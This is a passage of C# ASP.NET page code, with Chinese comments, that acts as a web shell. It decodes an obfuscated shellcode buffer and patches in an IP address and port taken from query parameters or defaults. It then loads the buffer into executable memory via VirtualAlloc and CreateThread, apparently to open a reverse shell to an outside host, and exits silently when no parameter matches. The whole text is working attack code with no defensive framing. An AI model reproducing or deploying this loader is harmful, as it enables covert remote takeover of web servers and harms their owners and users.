        byte[] buf = new byte[enc.Length];
        for (int i = 0; i < buf.Length; i++)
            buf[i] = (byte)(((uint)enc[i] - 5) & 0xFF);

        // ====== 5. 注入 IP 和端口 ======
        byte[] pattern = { 0x02, 0x00, 0x22, 0x22 };
        int pos = -1;
        for (int i = 0; i <= buf.Length - pattern.Length; i++)
        {
            bool found = true;
            for (int j = 0; j < pattern.Length; j++)
                if (buf[i + j] != pattern[j]) { found = false; break; }
            if (found) { pos = i; break; }
        }
        if (pos != -1)
        {
            int portOff = pos + 2;
            int ipOff   = pos + 4;

            buf[portOff]     = (byte)((port >> 8) & 0xFF);
            buf[portOff + 1] = (byte)(port & 0xFF);

            string[] parts = ipStr.Split('.');
            if (parts.Length == 4)
            {
                buf[ipOff]     = byte.Parse(parts[0]);
                buf[ipOff + 1] = byte.Parse(parts[1]);
                buf[ipOff + 2] = byte.Parse(parts[2]);
                buf[ipOff + 3] = byte.Parse(parts[3]);
            }
        }

        // ====== 6. 分配内存并执行 ======
        IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)buf.Length, 0x3000, 0x40);
        Marshal.Copy(buf, 0, addr, buf.Length);
        IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
        WaitForSingleObject(hThread, 0xFFFFFFFF);
    }

    protected void Page_Load(object sender, EventArgs e)
    {
        string cmd      = Request.QueryString["cmd"];
        string ipParam  = Request.QueryString["ip"];
        string portParam = Request.QueryString["port"];

        // 自定义目标
        if (!string.IsNullOrEmpty(ipParam) && !string.IsNullOrEmpty(portParam))
        {
            string[] parts = ipParam.Split('.');
            bool ipValid = (parts.Length == 4);
            if (ipValid)
            {
                foreach (string p in parts)
                {
                    byte temp;
                    if (!byte.TryParse(p, out temp)) { ipValid = false; break; }
                }
            }

            int port;
            bool portValid = int.TryParse(portParam, out port) && port > 0 && port < 65536;

            if (ipValid && portValid)
            {
                Execute(ipParam, port);
                return;
            }
        }

        // cmd=run 使用默认值
        if (string.Equals(cmd, "run", StringComparison.OrdinalIgnoreCase))
        {
            Execute(defaultIp, defaultPort);
            return;
        }

        // 无有效参数，静默退出
    }
